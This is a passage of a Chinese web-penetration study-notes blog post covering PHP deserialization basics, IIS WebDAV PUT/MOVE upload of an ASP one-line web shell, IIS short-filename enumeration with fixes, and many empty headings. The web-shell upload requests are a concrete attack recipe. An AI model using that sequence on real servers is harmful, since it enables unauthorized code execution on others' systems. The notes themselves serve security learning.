<h2 id="十二、反序列化漏洞"><a href="#十二、反序列化漏洞" class="headerlink" title="十二、反序列化漏洞"></a>十二、反序列化漏洞</h2><h3 id="1-php反序列化"><a href="#1-php反序列化" class="headerlink" title="1 php反序列化"></a>1 php反序列化</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105891381">PHP序列化反序列化漏洞总结</a></p>
</blockquote>
<h4 id="1-1-序列化知识"><a href="#1-1-序列化知识" class="headerlink" title="1.1 序列化知识"></a>1.1 序列化知识</h4><blockquote>
<p>序列化：<code>serialize($class);</code></p>
<p>当序列化对象时，PHP在序列化动作之前调用该对象成员函数<code>__sleep</code>。这样就允许对象在被序列化之前做任何清除操作。</p>
<p>反序列化：<code>unserialize($class);</code></p>
<p>若被序列化的变量是一个对象，在重新构造对象后，会自动调用<code>__wakeup</code>成员函数（如果有的话）。</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>序列化前</th>
<th>序列化后</th>
</tr>
</thead>
<tbody>
<tr>
<td>NULL</td>
<td><code>N</code></td>
</tr>
<tr>
<td>boolean</td>
<td><code>b:0，b:1</code></td>
</tr>
<tr>
<td>integer</td>
<td><code>i:&lt;num&gt;</code></td>
</tr>
<tr>
<td>double</td>
<td><code>d:&lt;num&gt;</code></td>
</tr>
<tr>
<td>string</td>
<td><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;</code></td>
</tr>
<tr>
<td>array</td>
<td><code>a:&lt;len&gt;:&#123;&lt;key1&gt;&lt;value1&gt;...&#125;</code></td>
</tr>
<tr>
<td>object</td>
<td><code>O:&lt;class_name_length&gt;:&lt;class_name&gt;:&lt;len&gt;:&#123;&lt;field name1&gt;&lt;field value1&gt;...&#125;</code>，只有属性没有字段</td>
</tr>
</tbody>
</table>
</div>
<h4 id="1-2-序列化利用"><a href="#1-2-序列化利用" class="headerlink" title="1.2 序列化利用"></a>1.2 序列化利用</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__construct</span>([<span class="keyword">mixed</span> <span class="variable">$args</span>[, $...]]);</span><br><span class="line"><span class="comment">// 析构函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__destruct</span>(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象被当成字符串使用</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">__toString</span>(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserilize()前调用（序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行）</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__wakeup</span>();</span><br><span class="line"><span class="comment">// serilize()前调用</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__sleep</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.更改对象的&lt;len&gt;值，当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单案例</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title">ease</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $method;</span><br><span class="line">	<span class="keyword">private</span> $args;</span><br><span class="line">	function __construct($method,$args)</span><br><span class="line">	&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;method=$method;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;args=$args;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ease(<span class="string">&quot;ping&quot;</span>,array(<span class="string">&quot;l&#x27;&#x27;s&quot;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b<span class="number">.&#x27;</span>&lt;/br&gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">echo base64_encode(serialize($a));</span></span><br></pre></td></tr></table></figure>
<h3 id="2-JAVA反序列化"><a href="#2-JAVA反序列化" class="headerlink" title="2 JAVA反序列化"></a>2 JAVA反序列化</h3><hr>
<h2 id="十三、SSTI模版注入"><a href="#十三、SSTI模版注入" class="headerlink" title="十三、SSTI模版注入"></a>十三、SSTI模版注入</h2><hr>
<h2 id="十四、中间件漏洞"><a href="#十四、中间件漏洞" class="headerlink" title="十四、中间件漏洞"></a>十四、中间件漏洞</h2><h3 id="1-IIS"><a href="#1-IIS" class="headerlink" title="1 IIS"></a>1 IIS</h3><h4 id="1-1-PUT上传漏洞"><a href="#1-1-PUT上传漏洞" class="headerlink" title="1.1 PUT上传漏洞"></a>1.1 PUT上传漏洞</h4><ul>
<li><p>IIS6.0 PUT漏洞原因</p>
<blockquote>
<p>WebDAV是一种基于 HTTP1.1的通信协议，扩展了方法，让应用程序可以直接对服务器操作，并支持文件 lock 和 unlock ， 还支持文件的版本控制。</p>
</blockquote>
<ol>
<li>IIS Server 在 Web 服务扩展中开启了 WebDAV。</li>
<li>IIS 配置了可以写入的权限。</li>
</ol>
</li>
<li><p>漏洞利用：</p>
<ol>
<li><p>利用 OPTIONS 测试 WebDAV 是否开启</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用 PUT 协议上传 &lt;%eval request(“123”)%&gt; 的 txt 文件</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">......（构造包头）</span><br><span class="line"> &lt;%eval request(&quot;123&quot;)%&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用 move 方法将扩展改成 asp</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br><span class="line">Destination:url/shell.asp</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ul>
<h4 id="1-2-短文件名枚举漏洞"><a href="#1-2-短文件名枚举漏洞" class="headerlink" title="1.2 短文件名枚举漏洞"></a>1.2 短文件名枚举漏洞</h4><ul>
<li><p style="color:red">漏洞原理</p>

<blockquote>
<p>…</p>
<p>例如文件中存在一个名为<code>backup-09df9a1s9d1ga9sdg1as.sql</code>的文件，此时只需要访问<code>http://ip/backup~1.sql</code>就可以访问到。</p>
</blockquote>
</li>
<li><p>漏洞利用</p>
<blockquote>
<p>设 IIS6.0，网站根目录存在backup698.txt。</p>
<ol>
<li>访问<code>http://ip/a\*~1\*/.aspx</code>，返回400，说明不存在。</li>
<li>访问<code>http://ip/b\*~1\*/.aspx</code>，返回404，说明存在。</li>
<li>然后继续试<code>http://ip/ba\*~1\*/.aspx</code>，以此类推。</li>
<li>判断出前六位之后，去除后面那个*号再测试一次。如果返回404表示是文件夹，400则是文件（因为*是通配符）</li>
</ol>
<p>漏洞利用工具：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner/pulls">IIS_shortname_Scanner</a></p>
</blockquote>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>IIS 版本</th>
<th>URL</th>
<th>结果/错误信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>IIS 6</td>
<td>/valid*~1*/.aspx</td>
<td>HTTP 404-File not found</td>
</tr>
<tr>
<td>IIS 6</td>
<td>/Invalid*~1*/.aspx</td>
<td>HTTP 400-Bad Request</td>
</tr>
<tr>
<td>IIS 5.x</td>
<td>/valid*~1*</td>
<td>HTTP 404-File not found</td>
</tr>
<tr>
<td>IIS 5.x</td>
<td>/Invalid*~1*</td>
<td>HTTP 400-Bad Request</td>
</tr>
<tr>
<td>IIS 7.x.NET.2（无出错处理）</td>
<td>/valid*~1*/</td>
<td>页面中包含“Error Code 0x00000000”</td>
</tr>
<tr>
<td>IIS 7.x.NET.2（无出错处理）</td>
<td>/Invalid*~1*/</td>
<td>页面中包含“Error Code 0x80070002”</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>漏洞修复</p>
<ol>
<li><p>关闭NTFS对8.3文件名格式的支持</p>
<blockquote>
<p>修改下列的注册列表值为1，然后重启。（此修改只能禁止NTFS对8.3文件名格式的支持，无法移除已经存在的文件的段文件名）</p>
<p><code>HKLM\STSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation</code></p>
</blockquote>
</li>
<li><p>禁用ASP.NET</p>
<blockquote>
<p>IIS管理器——Web服务扩展——ASP.NET禁用</p>
</blockquote>
</li>
<li><p>禁止在url中用”~”以及其Unicode编码。</p>
</li>
</ol>
</li>
</ul>
<h4 id="1-3-HTTPS-sys"><a href="#1-3-HTTPS-sys" class="headerlink" title="1.3 HTTPS.sys"></a>1.3 HTTPS.sys</h4><h3 id="2-JBoss"><a href="#2-JBoss" class="headerlink" title="2 JBoss"></a>2 JBoss</h3><ul>
<li><p>重要目录文件</p>
</li>
<li><p>未授权访问</p>
</li>
</ul>
<h3 id="3-Tomcat"><a href="#3-Tomcat" class="headerlink" title="3 Tomcat"></a>3 Tomcat</h3><ul>
<li><p>弱口令</p>
</li>
<li><p>远程代码执行</p>
</li>
</ul>
<h3 id="4-WebLogic"><a href="#4-WebLogic" class="headerlink" title="4 WebLogic"></a>4 WebLogic</h3><ul>
<li>弱口令</li>
</ul>
<hr>
<h2 id="十五、解析漏洞"><a href="#十五、解析漏洞" class="headerlink" title="十五、解析漏洞"></a>十五、解析漏洞</h2><h3 id="1-Web容器"><a href="#1-Web容器" class="headerlink" title="1 Web容器"></a>1 Web容器</h3><h3 id="2-Apache"><a href="#2-Apache" class="headerlink" title="2 Apache"></a>2 Apache</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32261191/article/details/124287798">Struts2 S2-062(CVE-2021-31805)漏洞分析及复现<em>s2漏洞</em>江左盟宗主的博客-CSDN博客</a></p>
</blockquote>
<h3 id="3-PHP-CGI"><a href="#3-PHP-CGI" class="headerlink" title="3 PHP CGI"></a>3 PHP CGI</h3><h3 id="4-IIS"><a href="#4-IIS" class="headerlink" title="4 IIS"></a>4 IIS</h3><h3 id="5-Nginx"><a href="#5-Nginx" class="headerlink" title="5 Nginx"></a>5 Nginx</h3><hr>
<h2 id="十六、数据库漏洞"><a href="#十六、数据库漏洞" class="headerlink" title="十六、数据库漏洞"></a>十六、数据库漏洞</h2><h3 id="1-SQL-Server"><a href="#1-SQL-Server" class="headerlink" title="1 SQL Server"></a>1 SQL Server</h3><h3 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2 MySQL"></a>2 MySQL</h3><h3 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3 Oracle"></a>3 Oracle</h3><h3 id="4-Redis"><a href="#4-Redis" class="headerlink" title="4 Redis"></a>4 Redis</h3><h3 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5 漏洞修复"></a>5 漏洞修复</h3><hr>
<h2 id="※十七、代码审计"><a href="#※十七、代码审计" class="headerlink" title="※十七、代码审计"></a>※十七、代码审计</h2><ul>
<li><p>网页源码</p>
<ol>
<li><strong>【命令执行】</strong>cat php|base64：直接显示。</li>
<li><strong>【命令执行】</strong>使用 cat php 包含网页后可以：网页右键——查看源代码。</li>
</ol>
</li>
<li><p>代码审计工具</p>
<blockquote>
<p>C/C++：PC-Lint、JAVA：PMD、.NET：StyleCop、C#：FxCop。</p>
<p>静态分析—Bug查找：PMD、FindBugs、Coverity、Klocwork。</p>
</blockquote>
</li>
</ul>
<hr>
<h2 id="※十八、逻辑漏洞"><a href="#※十八、逻辑漏洞" class="headerlink" title="※十八、逻辑漏洞"></a>※十八、逻辑漏洞</h2><blockquote>
<p>程序业务或功能上的设计缺陷。</p>
</blockquote>
<ol>
<li><p>越权</p>
<blockquote>
<p>本质：某账户拥有了超出它应有权限的范围。</p>
<p>水平越权：拥有了同等的其他账户的权限。</p>
<p>垂直越权：拥有了更高账户的权限。</p>
</blockquote>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://Magialeaf.github.io">Maigaleaf</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://magialeaf.github.io/posts/54924480.html">http://magialeaf.github.io/posts/54924480.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Magialeaf.github.io" target="_blank">Magialeaf的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A6%82%E8%BF%B0/">概述</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover_10.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/cc1b9611.html" title="JavaScript"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_15.png" onerror="onerror=null;src='/img/error.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JavaScript</div></div></a></div><div class="next-post pull-right"><a href="/posts/5cfe0bd9.html" title="Web渗透工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_7.png" onerror="onerror=null;src='/img/error.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web渗透工具</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2810fc66.html" title="Python渗透"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_10.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-10-06</div><div class="title">Python渗透</div></div></a></div><div><a href="/posts/5cfe0bd9.html" title="Web渗透工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_7.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-09-21</div><div class="title">Web渗透工具</div></div></a></div><div><a href="/posts/dd9c034b.html" title="网站配置记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_15.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-09-04</div><div class="title">网站配置记录</div></div></a></div><div><a href="/posts/9ad5026b.html" title="区块链技术"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_9.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-08-13</div><div class="title">区块链技术</div></div></a></div><div><a href="/posts/e3bc6d90.html" title="密码学工具知识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_15.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-06-07</div><div class="title">密码学工具知识</div></div></a></div><div><a href="/posts/30ce291f.html" title="密码学理论知识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_12.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-09-12</div><div class="title">密码学理论知识</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Maigaleaf</div><div class="author-info__description">欢迎来到我的小窝！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Magialeaf"><i class="fab fa-github"></i><span>前往我的仓库</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://res.abeim.cn/api/qq?qq=1871154309" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="https://space.bilibili.com/45054712" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_51591267" target="_blank" title="CSDN"><i class="fa-solid fa-c" style="color: ;"></i></a><a class="social-icon" href="https://leetcode.cn/u/heuristic-chandrasekhardtz/" target="_blank" title="leetcode"><i class="fas fa-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><card_announce_top>当前网站版本为V1.03<br /></card_announce_top> <card_announce_content> 1.网站目前文章多为思维导图，类似随笔，记录比较简略。<br /> 2.之后会完善一些未写完的文章，以及写一些详细的文章。<br /> 3.找文章推荐在分类中按<a href="/categories/" class="strong">分类</a>寻找。 <br /> 4.每日更新以及网站更新可以在<a href="/about/" class="strong">关于</a>中查看。<br /><br /> </card_announce_content> <card_announce_tip> 文章链接为紫色，链接前缀如下：<br /> &nbsp; 1.无前缀（百科或其他作者的链接）<br /> &nbsp; 2.author::（文章中引用了许多该作者的内容）<br /> &nbsp; 3.official::（官网链接）<br /> &nbsp; 4.text::（我的其他文本）<br /> &nbsp; 5.my::（我的库或其他链接）<br /> </card_announce_tip></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-text">Web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%87%E3%80%81Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">〇、Web安全基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-OWAPS"><span class="toc-text">1 OWAPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-http%E5%8D%8F%E8%AE%AE"><span class="toc-text">2 http协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Cookie%E4%B8%8ESession%E8%AF%A6%E8%A7%A3"><span class="toc-text">3 Cookie与Session详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-text">4 其他相关知识</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">一、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">1 注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2 MySQL数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-text">2.1 简单使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">2.2 联合注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">2.3 布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">2.4 时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-floor%E7%9B%B2%E6%B3%A8"><span class="toc-text">2.5 floor盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-XML%E6%B3%A8%E5%85%A5"><span class="toc-text">2.6 XML注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">2.7 宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-8-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%B3%A8%E5%85%A5"><span class="toc-text">2.8 增删改注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Oracle%E6%B3%A8%E5%85%A5"><span class="toc-text">3 Oracle注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-SQL-Server%E6%B3%A8%E5%85%A5"><span class="toc-text">4 SQL Server注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Access%E6%B3%A8%E5%85%A5"><span class="toc-text">5 Access注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5"><span class="toc-text">6 复杂注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">6.1 二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">6.2 堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-%E6%B3%A8%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-text">6.3 注入后门</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-sqlmap"><span class="toc-text">7 sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-text">8 SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-%E7%A9%BA%E6%A0%BC"><span class="toc-text">8.1 空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-text">8.2 内联注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-%E5%A4%8D%E5%86%99"><span class="toc-text">8.3 复写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-4-%E7%BC%96%E7%A0%81"><span class="toc-text">8.4 编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SQL%E5%8A%A0%E5%9B%BA%E9%98%B2%E6%8A%A4"><span class="toc-text">9 SQL加固防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-1-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-text">9.1 数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-text">9.2 字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2"><span class="toc-text">9.3 参数化查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">9.4 服务器配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%BB%E4%BA%8C%E3%80%81%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-text">※二、身份认证攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">三、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E6%9C%AC%E8%BA%AB%E7%BB%95%E8%BF%87"><span class="toc-text">1 文件本身绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-JS%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">1.1 JS过滤绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-text">1.2 文件名绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0"><span class="toc-text">1.3 文件截断上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">2 其他文件绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-htaccess%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">2.1 .htaccess文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-user-ini"><span class="toc-text">2.2 .user.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">2.3 竞争条件上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">3 字符绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">3.1 短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E6%8A%A4"><span class="toc-text">4 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%BB%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-text">※四、文件下载漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">五、文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%9A%E4%B9%89"><span class="toc-text">1 定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">2 本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3 系统文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHP%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">4 PHP常用伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-filter"><span class="toc-text">4.1 filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-input"><span class="toc-text">4.2 input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-file"><span class="toc-text">4.3 file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-data"><span class="toc-text">4.4 data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-phar"><span class="toc-text">4.5 phar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-zip"><span class="toc-text">4.6 zip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 